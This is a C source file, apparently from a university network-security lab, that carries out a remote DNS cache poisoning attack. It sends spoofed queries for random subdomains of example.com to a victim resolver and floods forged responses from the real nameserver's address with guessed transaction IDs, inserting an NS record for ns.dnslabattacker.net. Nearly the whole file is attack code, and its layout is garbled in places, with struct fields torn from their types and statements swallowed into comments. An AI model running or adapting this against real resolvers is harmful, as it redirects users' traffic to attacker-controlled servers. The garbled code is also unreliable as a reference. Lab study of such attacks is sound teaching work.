// ----dns_request_demo.c------
// This sample program must be run by root lol!
// query
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for
// the lab, please finish the response packet and complete the task. //
// Compile command:
// gcc -lpcap dns_request_demo.c -o dns_request_demo //
//
#include <unistd.h> #include <stdio.h> #include <sys/socket.h> #include <netinet/ip.h> #include <netinet/udp.h> #include <fcntl.h> #include <string.h> #include <errno.h> #include <stdlib.h> #include <libnet.h>
// The packet length
#define PCKT_LEN 8192 #define FLAG_R 0x8400 #define FLAG_Q 0x0100
// Can create separate header file (.h) for all headers' structure
// The IP header's structure
struct ipheader {
unsigned char iph_ihl: 4, iph_ver: 4;
unsigned char iph_tos;
unsigned short int iph_len;
unsigned short int iph_ident;
// unsigned char iph_flag;
unsigned short int iph_offset;
unsigned char iph_ttl;
unsigned char iph_protocol;
unsigned short int iph_chksum;
unsigned int iph_sourceip;
unsigned int iph_destip;
};

// UDP header's structure
struct udpheader {
unsigned short
unsigned short
unsigned short
unsigned short
};
struct dnsheader {
unsigned short unsigned short unsigned short unsigned short unsigned short unsigned short
int udph_srcport;
int udph_destport;
int udph_len;
int udph_chksum;
int query_id; int flags;
int QDCOUNT; int ANCOUNT; int NSCOUNT; int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. struct dataEnd
{
unsigned short int type;
unsigned short int class; };
// total udp header length: 8 bytes (=64 bits)

// structure to hold the answer end section struct ansEnd
{
unsigned short int type; unsigned short int class; unsigned short int ttl_l; unsigned short int ttl_h; unsigned short int datalen;
};
unsigned int checksum(uint16_t *usBuff, int isize) {
unsigned int cksum = 0; for(; isize > 1; isize -= 2) {
cksum += *usBuff++; }
if(isize == 1) {
cksum += *(uint16_t *)usBuff; }
return (cksum); }
// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len) {

unsigned long sum = 0;
struct ipheader *tempI = (struct ipheader *)(buffer);
struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
struct dnsheader *tempD = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
tempH->udph_chksum = 0;
sum = checksum( (uint16_t *) & (tempI->iph_sourceip) , 8 ); sum += checksum((uint16_t *) tempH, len);
sum += ntohs(IPPROTO_UDP + len);
sum = (sum >> 16) + (sum & 0x0000ffff); sum += (sum >> 16);
return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC,
// the checksum algorithm is:
// "The checksum field is the 16 bit one's complement of the one's
// complement sum of all 16 bit words in the header. For purposes of
// computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{

//
unsigned long sum;
for(sum = 0; nwords > 0; nwords--)
sum += *buf++;
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
return (unsigned short)(~sum);
}
void response(char *request_url, char *src_addr, char *dest_addr) {
int sd;
char buffer[PCKT_LEN]; memset(buffer, 0, PCKT_LEN);
// Our own headers' structures
struct ipheader *ip = (struct ipheader *) buffer;
struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
struct dnsheader *dns = (struct dnsheader *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));

// data is the pointer points to the first byte of the dns payload
char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
//Construct DNS Packet //The flag you need to set
dns->flags = htons(FLAG_R);
//only 1 query, so the count should be one. dns->QDCOUNT = htons(1); dns->ANCOUNT = htons(1); dns->NSCOUNT = htons(1);
dns->ARCOUNT = htons(1);
//query string
strcpy(data, request_url); int length = strlen(data) + 1;
struct dataEnd *end = (struct dataEnd *)(data + length); end->type = htons(1);
end->class = htons(1);
//Answer section
char *ans = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length);
strcpy(ans, request_url);
int anslength = strlen(ans) + 1;

struct ansEnd *ansend = (struct ansEnd *)(ans + anslength); ansend->type = htons(1);
ansend->class = htons(1);
ansend->ttl_l = htons(0x00);
ansend->ttl_h = htons(0xD0); ansend->datalen = htons(4);
char *ansaddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) +
sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength);
strcpy(ansaddr, "\1\1\1\1"); int addrlen = strlen(ansaddr);
//Authorization section
char *ns = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen);
strcpy(ns, "\7example\3com");
int nslength = strlen(ns) + 1;
struct ansEnd *nsend = (struct ansEnd *)(ns + nslength); nsend->type = htons(2);
nsend->class = htons(1);
nsend->ttl_l = htons(0x00);
nsend->ttl_h = htons(0xD0); nsend->datalen = htons(23);
char *nsname = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) +
sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength);

strcpy(nsname, "\2ns\16dnslabattacker\3net"); int nsnamelen = strlen(nsname) + 1;
//Additional section
char *ar = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) +
sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen);
strcpy(ar, "\2ns\16dnslabattacker\3net");
int arlength = strlen(ar) + 1;
struct ansEnd *arend = (struct ansEnd *)(ar + arlength);
arend->type = htons(1);
arend->class = htons(1);
arend->ttl_l = htons(0x00);
arend->ttl_h = htons(0xD0);
arend->datalen = htons(4);
char *araddr = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) +
sizeof(struct dataEnd) + length + sizeof(struct ansEnd) + anslength + addrlen + sizeof(struct ansEnd) + nslength + nsnamelen + arlength + sizeof(struct ansEnd));
strcpy(araddr, "\1\1\1\1"); int araddrlen = strlen(araddr);
//End Of DNS packet
struct sockaddr_in sin; int one = 1;
const int *val = &one;
// Create a raw socket with UDP protocol
sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

if(sd < 0 )
printf("socket error\n");
sin.sin_family = AF_INET;
sin.sin_port = htons(33333); //server port sin.sin_addr.s_addr = inet_addr(dest_addr); //server address
//Construct IP packet
ip->iph_ihl = 5;
ip->iph_ver = 4;
ip->iph_tos = 0; // Low delay
unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader)
+ length + sizeof(struct dataEnd) + anslength + sizeof( struct ansEnd) + nslength + sizeof(struct ansEnd) + addrlen
+ nsnamelen + arlength + sizeof(struct ansEnd) + araddrlen); // length + dataEnd_size == UDP_payload_size
ip->iph_len = htons(packetLength);
ip->iph_ident = htons(rand()); // we give a random number for the identification# ip->iph_ttl = 110; // hops
ip->iph_protocol = 17; // UDP
ip->iph_sourceip = inet_addr("199.43.135.53");
ip->iph_destip = inet_addr(dest_addr);
// Construct UDP packet
udp->udph_srcport = htons(53);
udp->udph_destport = htons(33333);
udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)
+ anslength + sizeof( struct ansEnd) + nslength + sizeof(struct ansEnd) + addrlen + nsnamelen + arlength

+ sizeof(struct ansEnd) + araddrlen); // udp_header_size + udp_payload_size
// Calculate the checksum for integrity
ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));
// Inform the kernel do not fill up the packet structure. we will build our own... if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
{
printf("error\n");
exit(-1); }
int count = 0;
int trans_id = 3000; while(count < 100) {
dns->query_id = trans_id + count;
udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
// send the packet out.
if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
printf("packet send error %d which means %s\n", errno, strerror(errno)); count++;
}
close(sd); }

int main(int argc, char *argv[]) {
if(argc != 3) {
printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP dest_IP \n");
exit(-1);
}
int sd;
char buffer[PCKT_LEN];
memset(buffer, 0, PCKT_LEN);
struct ipheader *ip = (struct ipheader *) buffer;
struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
struct dnsheader *dns = (struct dnsheader *) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
// data is the pointer points to the first byte of the dns payload
char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
/******Construct DNS Packet*******/
dns->flags = htons(FLAG_Q);
dns->QDCOUNT = htons(1);
dns->query_id = rand(); // transaction ID for the query packet, use random # strcpy(data, "\5abcde\7example\3com");
int length = strlen(data) + 1;
struct dataEnd *end = (struct dataEnd *)(data + length);

end->type = htons(1); end->class = htons(1);
/****** End of DNS Packet ********/
// Source and destination addresses: IP and port
struct sockaddr_in sin, din; int one = 1;
const int *val = &one;
// Create a raw socket with UDP protocol
sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP); if(sd < 0 )
printf("socket error\n");
sin.sin_family = AF_INET;
sin.sin_port = htons(33333); //server port number sin.sin_addr.s_addr = inet_addr(argv[2]); //server ip address
//Construct IP packet
ip->iph_ihl = 5; ip->iph_ver = 4; ip->iph_tos = 0;
unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
ip->iph_len = htons(packetLength);

ip->iph_ident = htons(rand()); // we give a random number for the identification# ip->iph_ttl = 110; // hops
ip->iph_protocol = 17; // UDP
ip->iph_sourceip = inet_addr(argv[1]);
ip->iph_destip = inet_addr(argv[2]);
/***End Of IP Packet**/
//Construct UDP packet
udp->udph_srcport = htons(33333);
udp->udph_destport = htons(53);
udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // udp_header_size + udp_payload_size
// Calculate the checksum for integrity//
ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // Inform the kernel do not fill up the packet structure. we will build our own... if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0 )
{
printf("error\n");
exit(-1); }
while(1) {
int charnumber;
charnumber = 1 + rand() % 5; *(data + charnumber) += 1;

udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader)); // recalculate the checksum for the UDP packet
// send the packet out.
if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
printf("packet send error %d which means %s\n", errno, strerror(errno)); sleep(0.9);
response(data, argv[1], argv[2]);
} close(sd);
return 0;
}
